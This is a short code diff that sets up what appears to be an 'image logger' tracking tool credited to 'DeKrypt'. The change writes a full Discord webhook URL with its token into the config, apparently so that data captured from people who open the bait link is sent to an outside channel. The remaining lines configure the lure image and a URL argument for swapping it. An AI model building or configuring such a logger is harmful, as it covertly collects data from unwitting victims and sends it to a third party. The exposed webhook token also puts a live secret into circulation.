@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
+    "webhook": "https://discord.com/api/webhooks/1341928223767789619/X6Wt-aYjY3fDSySnzjCFCJqhe82Kc6yXqUWxNe_6IjWhFOGgW1-YuZifo-a05ltMDvqs",
     "image": "https://vm.tiktok.com/ZMkvh3vRT/", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
